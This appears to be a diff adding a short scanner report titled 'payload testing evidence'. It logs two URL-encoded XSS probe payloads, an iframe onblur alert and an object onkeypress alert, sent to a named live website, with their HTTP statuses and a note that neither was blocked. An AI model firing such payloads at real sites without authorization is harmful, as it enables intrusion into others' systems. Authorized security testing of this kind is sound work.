@@ -1,0 +1,16 @@
+PAYLOAD TESTING EVIDENCE
+==================================================
+Target: https://pakyok77.link
+Total Tests: 2
+Successful: 1
+Blocked: 0
+Errors: 0
+
+PAYLOAD SAMPLES:
+------------------------------
+1. %253Ciframe%2520onblur%253D%2527alert%2528%2522XSS%2522%2529%2527%253E...
+   Status: 404, Blocked: False
+
+2. %3Cobject%20onkeypress%3Dalert%28%27XSS%27%29%3E...
+   Status: 200, Blocked: False
+
